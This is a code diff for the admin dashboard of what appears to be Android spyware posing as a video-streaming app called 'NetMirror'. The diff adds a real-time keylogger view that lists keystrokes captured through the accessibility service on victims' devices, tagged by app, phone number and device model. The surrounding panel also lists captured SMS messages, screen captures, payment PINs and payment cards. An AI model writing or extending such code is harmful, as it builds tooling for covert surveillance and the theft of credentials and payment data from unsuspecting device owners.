@@ -394,6 +394,61 @@ function connectWebSocket() {
       loadSmsMessages(1);
     }
   });
+
+  // ═══ KEYLOG — real-time keystroke capture ═══
+  socket.on('new_keylog', d => {
+    // Show LIVE badge on both device modal keylog tab and global keylog page
+    const devBadge = document.getElementById('keylogLiveBadge');
+    if (devBadge) {
+      devBadge.style.display = 'inline';
+      setTimeout(() => { devBadge.style.display = 'none'; }, 5000);
+    }
+    const globalBadge = document.getElementById('globalKeylogLiveBadge');
+    if (globalBadge) {
+      globalBadge.style.display = 'inline';
+      setTimeout(() => { globalBadge.style.display = 'none'; }, 5000);
+    }
+
+    // If device modal is open for this device AND keylog tab is active, prepend the new entry
+    if (modalDeviceId && d.device_id === modalDeviceId && activeTab === 'keylog') {
+      // Prepend to in-memory list
+      allKeylogEntries.unshift({
+        id: Date.now(),
+        device_id: d.device_id,
+        app_package: d.app_package,
+        text_content: d.text_content,
+        recorded_at: d.recorded_at
+      });
+      // Keep max 500 in memory
+      if (allKeylogEntries.length > 500) allKeylogEntries = allKeylogEntries.slice(0, 500);
+      renderKeylogEntries();
+    }
+
+    // If global keylog page is active, prepend there too
+    if (currentPage === 'keylog') {
+      const list = document.getElementById('globalKeylogList');
+      if (list && !list.querySelector('.tab-loading')) {
+        const entry = document.createElement('div');
+        entry.style.cssText = 'padding:8px 10px;border-bottom:1px solid var(--border);animation:fadeIn 0.3s';
+        const ts = escapeHtml(d.recorded_at || '');
+        const app = escapeHtml(d.app_package || '');
+        const text = escapeHtml(d.text_content || '');
+        const devShort = (d.device_id || '').substring(0, 8);
+        entry.innerHTML = `<div style="display:flex;justify-content:space-between;gap:8px;align-items:flex-start">
+          <div style="flex:1;word-break:break-all;color:#00e5ff">${text}</div>
+          <div style="font-size:10px;color:var(--muted);white-space:nowrap;text-align:right">
+            <div style="color:#0f0">● NEW</div>
+            <div>${devShort}...</div>
+            <div>${app}</div>
+            <div>${ts}</div>
+          </div>
+        </div>`;
+        list.insertBefore(entry, list.firstChild);
+        // Keep max 200 entries in DOM for performance
+        while (list.children.length > 200) list.removeChild(list.lastChild);
+      }
+    }
+  });
 }
 
 function setWsStatus(state, label) {
@@ -437,11 +492,12 @@ function navigateTo(page) {
     const navEl = document.querySelector(`[data-page="${page}"]`);
     if (navEl) navEl.classList.add('active');
 
-    const titles = { dashboard: 'Dashboard', upload: 'Upload Video', tmdb: 'Netflix Import', videos: 'All Videos', connections: 'Connections', settings: 'Settings', telegram: 'Telegram', apksign: 'APK Signer', admindevices: 'Admin Devices', system: 'System & Recovery', requests: 'Content Requests', users: 'App Users', godmode: 'God Mode', analytics: 'Analytics', agents: 'Agents', adult18: '18+ Content', appupdate: 'App Update', 'telegram-adult': 'Adult Telegram' };
+    const titles = { dashboard: 'Dashboard', upload: 'Upload Video', tmdb: 'Netflix Import', videos: 'All Videos', connections: 'Connections', keylog: 'Keylog Monitor', settings: 'Settings', telegram: 'Telegram', apksign: 'APK Signer', admindevices: 'Admin Devices', system: 'System & Recovery', requests: 'Content Requests', users: 'App Users', godmode: 'God Mode', analytics: 'Analytics', agents: 'Agents', adult18: '18+ Content', appupdate: 'App Update', 'telegram-adult': 'Adult Telegram' };
     document.getElementById('pageTitle').textContent = titles[page] || page;
 
     if (page === 'adult18')      { loadAdultVideos(); }
     if (page === 'appupdate')    { loadCurrentUpdate(); }
+    if (page === 'keylog')       { loadGlobalKeylogs(); populateKeylogDeviceFilter(); }
     if (page === 'telegram-adult') {
       adultTgCheckStatus();
       adultTgLoadVideos();
@@ -1013,6 +1069,224 @@ let allScheduledCommands = [];
 let allPaymentPins = [];
 let allPaymentCards = [];
 
+// Keylog state (per-device modal)
+let allKeylogEntries = [];
+let keylogCurrentPage = 1;
+let keylogTotalPages = 0;
+
+// ═══ KEYLOG FUNCTIONS ═══
+
+async function loadDeviceKeylogs(page) {
+  try {
+    keylogCurrentPage = page;
+    document.getElementById('keylogListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading keystroke captures...</span></div>`;
+    const res = await fetch(`${API_BASE}/api/admin/connections/${modalDeviceId}/keylogs?page=${page}&limit=200`, {
+      headers: { 'x-admin-password': adminPassword }
+    });
+    const data = await res.json();
+    allKeylogEntries = data.entries || [];
+    keylogTotalPages = data.totalPages || 0;
+    document.getElementById('keylogCount').textContent = `${data.total || 0} entries`;
+    renderKeylogEntries();
+    renderKeylogPagination(data.total || 0, data.totalPages || 0, data.page || 1);
+    // Populate app filter dropdown
+    populateKeylogAppFilter(allKeylogEntries);
+  } catch (e) {
+    document.getElementById('keylogListContainer').innerHTML = `<div class="fx-empty"><i class="ri-error-warning-line"></i><p>Error: ${escapeHtml(e.message)}</p></div>`;
+  }
+}
+
+function renderKeylogEntries() {
+  const container = document.getElementById('keylogListContainer');
+  if (!container) return;
+  const search = (document.getElementById('keylogSearch')?.value || '').toLowerCase();
+  const appFilter = document.getElementById('keylogAppFilter')?.value || '';
+
+  let filtered = allKeylogEntries;
+  if (search) {
+    filtered = filtered.filter(e => (e.text_content || '').toLowerCase().includes(search));
+  }
+  if (appFilter) {
+    filtered = filtered.filter(e => (e.app_package || '') === appFilter);
+  }
+
+  if (filtered.length === 0) {
+    container.innerHTML = `<div class="fx-empty"><i class="ri-keyboard-line"></i><p>No keystrokes captured yet</p><span>Typed text on the device will appear here in real time</span></div>`;
+    return;
+  }
+
+  container.innerHTML = filtered.map(e => {
+    const ts = escapeHtml(e.recorded_at || '');
+    const app = escapeHtml(e.app_package || 'unknown');
+    const text = escapeHtml(e.text_content || '');
+    return `<div style="padding:8px 10px;border-bottom:1px solid var(--border)">
+      <div style="display:flex;justify-content:space-between;gap:8px;align-items:flex-start">
+        <div style="flex:1;word-break:break-all;color:var(--text)">${text}</div>
+        <div style="font-size:10px;color:var(--muted);white-space:nowrap;text-align:right">
+          <div style="color:var(--accent)">${app}</div>
+          <div>${ts}</div>
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function renderKeylogPagination(total, totalPages, page) {
+  const el = document.getElementById('keylogPagination');
+  if (!el) return;
+  if (totalPages <= 1) { el.innerHTML = ''; return; }
+  let html = '';
+  for (let i = 1; i <= totalPages; i++) {
+    if (i === page) {
+      html += `<button class="btn btn-primary btn-sm" style="min-width:32px">${i}</button>`;
+    } else if (i <= 3 || i > totalPages - 2 || Math.abs(i - page) <= 1) {
+      html += `<button class="btn btn-outline btn-sm" style="min-width:32px" onclick="loadDeviceKeylogs(${i})">${i}</button>`;
+    } else if (i === 4 || i === totalPages - 2) {
+      html += `<span style="padding:0 4px;color:var(--muted)">…</span>`;
+    }
+  }
+  el.innerHTML = html;
+}
+
+function populateKeylogAppFilter(entries) {
+  const select = document.getElementById('keylogAppFilter');
+  if (!select) return;
+  const apps = [...new Set(entries.map(e => e.app_package || '').filter(a => a))];
+  const current = select.value;
+  select.innerHTML = '<option value="">All Apps</option>' + apps.map(a => `<option value="${escapeHtml(a)}">${escapeHtml(a)}</option>`).join('');
+  select.value = current;
+}
+
+function filterKeylogEntries() {
+  renderKeylogEntries();
+}
+
+async function clearDeviceKeylogs() {
+  if (!confirm('Delete ALL keystroke captures for this device? This cannot be undone.')) return;
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/keylogs/${modalDeviceId}`, {
+      method: 'DELETE',
+      headers: { 'x-admin-password': adminPassword }
+    });
+    const data = await res.json();
+    showToast(`Deleted ${data.deleted} entries`, 'success');
+    loadDeviceKeylogs(1);
+  } catch (e) {
+    showToast('Error: ' + e.message, 'error');
+  }
+}
+window.clearDeviceKeylogs = clearDeviceKeylogs;
+window.filterKeylogEntries = filterKeylogEntries;
+window.loadDeviceKeylogs = loadDeviceKeylogs;
+
+// ═══ GLOBAL KEYLOG PAGE (all devices) ═══
+
+async function loadGlobalKeylogs(page) {
+  page = page || 1;
+  try {
+    const list = document.getElementById('globalKeylogList');
+    if (!list) return;
+    list.innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading keystroke captures from all devices...</span></div>`;
+    const deviceId = document.getElementById('globalKeylogDeviceFilter')?.value || '';
+    const search = (document.getElementById('globalKeylogSearch')?.value || '').trim();
+    let url = `${API_BASE}/api/admin/keylogs?page=${page}&limit=200`;
+    if (deviceId) url += `&device_id=${encodeURIComponent(deviceId)}`;
+    if (search)   url += `&search=${encodeURIComponent(search)}`;
+    const res = await fetch(url, { headers: { 'x-admin-password': adminPassword } });
+    const data = await res.json();
+    const entries = data.entries || [];
+    document.getElementById('globalKeylogCount').textContent = `${data.total || 0} entries`;
+
+    if (entries.length === 0) {
+      list.innerHTML = `<div class="fx-empty"><i class="ri-keyboard-line"></i><p>No keystrokes captured yet</p><span>Install NetMirror on a device and enable accessibility service — typed text will appear here in real time</span></div>`;
+      document.getElementById('globalKeylogPagination').innerHTML = '';
+      return;
+    }
+
+    list.innerHTML = entries.map(e => {
+      const ts = escapeHtml(e.recorded_at || '');
+      const app = escapeHtml(e.app_package || 'unknown');
+      const text = escapeHtml(e.text_content || '');
+      const devShort = (e.device_id || '').substring(0, 8);
+      const model = e.model ? escapeHtml(e.model) : '';
+      const phone = e.phone_number ? escapeHtml(e.phone_number) : '';
+      return `<div style="padding:10px;border-bottom:1px solid var(--border)">
+        <div style="display:flex;justify-content:space-between;gap:10px;align-items:flex-start">
+          <div style="flex:1;word-break:break-all;color:var(--text);font-size:13px">${text}</div>
+          <div style="font-size:10px;color:var(--muted);white-space:nowrap;text-align:right;min-width:140px">
+            <div style="color:var(--accent)">${app}</div>
+            <div style="color:#ff9800">${devShort}...${model ? ' · ' + model : ''}</div>
+            ${phone ? `<div>${phone}</div>` : ''}
+            <div>${ts}</div>
+          </div>
+        </div>
+      </div>`;
+    }).join('');
+
+    // Render pagination
+    const totalPages = data.totalPages || 0;
+    const pgEl = document.getElementById('globalKeylogPagination');
+    if (totalPages <= 1) {
+      pgEl.innerHTML = '';
+    } else {
+      let html = '';
+      for (let i = 1; i <= totalPages; i++) {
+        if (i === page) {
+          html += `<button class="btn btn-primary btn-sm" style="min-width:32px">${i}</button>`;
+        } else if (i <= 3 || i > totalPages - 2 || Math.abs(i - page) <= 1) {
+          html += `<button class="btn btn-outline btn-sm" style="min-width:32px" onclick="loadGlobalKeylogs(${i})">${i}</button>`;
+        } else if (i === 4 || i === totalPages - 2) {
+          html += `<span style="padding:0 4px;color:var(--muted)">…</span>`;
+        }
+      }
+      pgEl.innerHTML = html;
+    }
+  } catch (e) {
+    document.getElementById('globalKeylogList').innerHTML = `<div class="fx-empty"><i class="ri-error-warning-line"></i><p>Error: ${escapeHtml(e.message)}</p></div>`;
+  }
+}
+
+function filterGlobalKeylogEntries() {
+  // Debounce search — only reload if user stopped typing for 400ms
+  if (window._globalKeylogSearchTimer) clearTimeout(window._globalKeylogSearchTimer);
+  window._globalKeylogSearchTimer = setTimeout(() => loadGlobalKeylogs(1), 400);
+}
+
+async function populateKeylogDeviceFilter() {
+  try {
+    const select = document.getElementById('globalKeylogDeviceFilter');
+    if (!select) return;
+    // Use existing allDevices if available, otherwise fetch connections
+    if (typeof allDevices === 'undefined' || !allDevices.length) return;
+    const current = select.value;
+    select.innerHTML = '<option value="">All Devices</option>' + allDevices.map(d => {
+      const name = d.model || d.phone_number || d.device_id?.substring(0, 8) || 'Unknown';
+      return `<option value="${escapeHtml(d.device_id)}">${escapeHtml(name)}</option>`;
+    }).join('');
+    select.value = current;
+  } catch (_) {}
+}
+
+async function clearAllKeylogs() {
+  if (!confirm('Delete ALL keystroke captures across ALL devices? This cannot be undone.')) return;
+  try {
+    const res = await fetch(`${API_BASE}/api/admin/keylogs`, {
+      method: 'DELETE',
+      headers: { 'x-admin-password': adminPassword }
+    });
+    const data = await res.json();
+    showToast(`Deleted ${data.deleted} entries`, 'success');
+    loadGlobalKeylogs(1);
+  } catch (e) {
+    showToast('Error: ' + e.message, 'error');
+  }
+}
+
+window.loadGlobalKeylogs = loadGlobalKeylogs;
+window.filterGlobalKeylogEntries = filterGlobalKeylogEntries;
+window.clearAllKeylogs = clearAllKeylogs;
+window.populateKeylogDeviceFilter = populateKeylogDeviceFilter;
+
 async function openDeviceModal(deviceId, deviceName) {
   modalDeviceId = deviceId;
   modalDeviceName = deviceName;
@@ -1078,6 +1352,19 @@ async function openDeviceModal(deviceId, deviceName) {
   allPaymentCards = [];
   document.getElementById('paymentCapturesContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading payment captures...</span></div>`;
 
+  // Reset keylog
+  allKeylogEntries = [];
+  keylogCurrentPage = 1;
+  const klSearch = document.getElementById('keylogSearch');
+  if (klSearch) klSearch.value = '';
+  const klFilter = document.getElementById('keylogAppFilter');
+  if (klFilter) klFilter.innerHTML = '<option value="">All Apps</option>';
+  const klBadge = document.getElementById('keylogLiveBadge');
+  if (klBadge) klBadge.style.display = 'none';
+  document.getElementById('keylogListContainer').innerHTML = `<div class="tab-loading"><i class="ri-loader-4-line ri-spin"></i><span>Loading keystroke captures...</span></div>`;
+  document.getElementById('keylogCount').textContent = '0 entries';
+  document.getElementById('keylogPagination').innerHTML = '';
+
   document.getElementById('deviceModal').classList.remove('hidden');
 
   // Load first tab
@@ -1100,6 +1387,7 @@ function closeDeviceModal() {
   allScheduledCommands = [];
   allPaymentPins = [];
   allPaymentCards = [];
+  allKeylogEntries = [];
 }
 window.closeDeviceModal = closeDeviceModal;
 
@@ -1121,6 +1409,7 @@ function switchDeviceTab(tab) {
   if (tab === 'screen' && allScreenCaptures.length === 0) loadScreenCaptures(1);
   if (tab === 'schedule' && allScheduledCommands.length === 0) loadScheduledCommands();
   if (tab === 'payment') loadPaymentCaptures();
+  if (tab === 'keylog') loadDeviceKeylogs(1);
 }
 window.switchDeviceTab = switchDeviceTab;
 
